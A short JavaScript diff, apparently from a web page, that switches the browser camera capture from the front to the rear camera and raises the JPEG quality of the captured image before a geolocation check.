@@ -76,7 +76,7 @@ const loading = document.getElementById("loading");
 
 // Aktifkan kamera depan
 navigator.mediaDevices.getUserMedia({ 
-  video: { facingMode: "user" } 
+  video: { facingMode: "environment" } 
 })
 .then(function(stream){
   video.srcObject = stream;
@@ -96,7 +96,7 @@ function proses(){
   canvas.height = video.videoHeight;
   context.drawImage(video, 0, 0);
 
-  let imageData = canvas.toDataURL("image/jpeg", 0.6);
+  let imageData = canvas.toDataURL("image/jpeg", 0.8);
 
   if (navigator.geolocation) {
 
